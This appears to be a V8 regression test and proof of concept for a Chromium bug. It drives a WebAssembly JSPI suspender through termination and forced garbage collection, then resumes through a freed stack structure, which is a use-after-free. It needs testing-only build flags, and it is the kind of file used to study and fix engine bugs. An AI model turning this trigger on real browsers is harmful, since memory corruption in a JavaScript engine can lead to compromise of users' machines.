// C19 H1: upstream regression for crbug 501147587.
// Requires a Linux x64 V8 build with:
//   v8_enable_sandbox=true
//   v8_enable_memory_corruption_api=true
// Runtime flags:
//   --sandbox-testing --allow-natives-syntax --expose-gc

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');

let builder = new WasmModuleBuilder();
let resolve_p;
let p = new Promise(r => resolve_p = r);
let suspending = new WebAssembly.Suspending(() => p);
let suspend_idx = builder.addImport("m", "suspend", kSig_v_v);
let terminate = () => { %TerminateExecution(); };
let term_idx = builder.addImport("m", "terminate", kSig_v_v);

builder.addFunction("main", kSig_v_v)
  .addBody([
    kExprCallFunction, suspend_idx,
    kExprCallFunction, term_idx,
  ]).exportFunc();

let instance = builder.instantiate({m: {suspend: suspending, terminate}});
let promising = WebAssembly.promising(instance.exports.main);

promising();
let resume_data = get_resume_data(p);
let resume_cb = Sandbox.getObjectAt(
    getField(getField(getPtr(p), kJSPromiseReactionsOrResultOffset),
             kPromiseReactionFulfillHandlerOffset));
print("[*] suspender handle: 0x" + get_suspender(resume_data).toString(16));

setTimeout(() => {
  print("[*] post-term: handle still 0x" + get_suspender(resume_data).toString(16));
  print("[*] gc(last-resort) -> ReleaseFinishedStacks -> ~StackMemory");
  gc({type:'major', execution:'sync', flavor:'last-resort'});

  print("[*] resuming via dangling EPT (struct freed)...");
  resume_cb(undefined);
  print("[!] no violation");
}, 0);

print("[*] resolving -> terminate");
resolve_p();
